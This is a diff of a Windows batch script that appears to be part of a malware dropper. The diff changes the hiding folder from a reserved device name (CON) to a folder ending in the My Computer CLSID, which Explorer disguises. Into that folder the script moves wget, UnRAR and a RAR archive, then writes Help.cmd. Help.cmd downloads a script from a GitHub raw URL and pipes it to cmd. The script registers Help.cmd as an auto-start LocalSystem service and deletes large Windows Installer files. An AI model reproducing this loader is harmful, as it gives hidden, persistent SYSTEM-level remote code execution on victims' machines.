@@ -15,12 +15,12 @@ for %a in (%processList%) do (
     )
 )
 
-mkdir "\\.\%ProgramData%\CON"
+mkdir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 for %F in (%WINDIR%\Installer\*.msi) do if %~zF gtr 524288000 del /f /q "%F"
 
-move /Y "%ProgramData%\Comms\wget.exe" "\\.\%ProgramData%\CON\"
-move /Y "%ProgramData%\Comms\guard.rar" "\\.\%ProgramData%\CON\"
-move /Y "%ProgramData%\Comms\UnRAR.exe" "\\.\%ProgramData%\CON\"
+move /Y "%ProgramData%\Comms\wget.exe" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
+move /Y "%ProgramData%\Comms\guard.rar" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
+move /Y "%ProgramData%\Comms\UnRAR.exe" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
 
-echo \\.\%ProgramData%\CON\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/zen ^| cmd /Q /V:ON >> "\\.\%ProgramData%\CON\Help.cmd"
-sc create Help binPath=""\\.\%ProgramData%\CON\Help.cmd" start="auto" obj="LocalSystem"
+echo %ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/zen ^| cmd /Q /V:ON >> "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Help.cmd"
+sc create Help binPath="%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Help.cmd" start="auto" obj="LocalSystem"
